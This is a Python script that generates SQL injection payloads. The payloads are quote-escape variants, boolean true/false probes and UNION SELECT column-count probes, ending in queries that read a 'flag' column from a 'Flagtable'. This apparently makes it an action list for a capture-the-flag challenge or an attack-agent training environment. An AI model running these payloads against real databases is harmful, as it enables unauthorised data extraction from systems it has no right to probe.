def generate_actions(escapes=None, max_columns=5):
    actions = []
    if escapes is None:
        escapes = ['"', "'", ""]
    for esc in escapes:
        actions.append(f"{esc} and {esc}1{esc}={esc}1" + ("#" if esc == "" else ""))
        actions.append(f"{esc} and {esc}1{esc}={esc}2" + ("#" if esc == "" else ""))
        columns = "1"
        for i in range(2, max_columns + 2):
            actions.append(f"{esc} union select {columns}#")
            actions.append(f"{esc} union select {columns} limit 1 offset 1#")
            columns += f",{i}"
        columns = "flag"
        for i in range(2, max_columns + 2):
            actions.append(
                f"{esc} union select {columns} from Flagtable limit 1 offset 2#"
            )
            columns += ",flag"
    return actions


if __name__ == "__main__":
    actions = generate_actions()
    print("Possible list of actions:", len(actions))
    for action in actions:
        print(action)
